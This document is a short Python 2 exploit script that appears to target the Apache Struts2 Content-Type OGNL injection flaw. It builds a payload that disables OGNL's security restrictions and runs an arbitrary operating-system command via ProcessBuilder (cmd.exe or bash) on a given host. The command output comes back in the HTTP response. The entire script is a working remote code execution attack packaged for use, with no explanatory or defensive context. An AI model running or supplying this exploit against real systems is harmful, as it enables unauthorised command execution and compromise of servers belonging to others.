#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import urllib2
import httplib

def exploit(host,cmd):
    print "[Execute]: " + cmd + "\n"
    ognl_payload = "%{(#_='multipart/form-data')."
    ognl_payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    ognl_payload += "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    ognl_payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    ognl_payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    ognl_payload += "(#ognlUtil.getExcludedClasses().clear())."
    ognl_payload += "(#context.setMemberAccess(#dm))))."
    ognl_payload += "(#cmd='{}').".format(cmd)
    ognl_payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    ognl_payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    ognl_payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    ognl_payload += "(#p.redirectErrorStream(true))."
    ognl_payload += "(#process=#p.start())."
    ognl_payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    ognl_payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    ognl_payload += "(#ros.flush())"
    ognl_payload += "}"

    if not ":" in host:
        host = "{}:8080".format(host)

    url = "http://{}/showcase.action".format(host)

    headers = {'Content-Type': ognl_payload}
    try:
        request = urllib2.Request(url, headers=headers)
        response = urllib2.urlopen(request).read()
    except httplib.IncompleteRead, e:
        response = e.partial
    print response


if len(sys.argv) < 3:
    sys.exit('Usage: %s <host:port> <cmd>' % sys.argv[0])
else:
    exploit(sys.argv[1],sys.argv[2])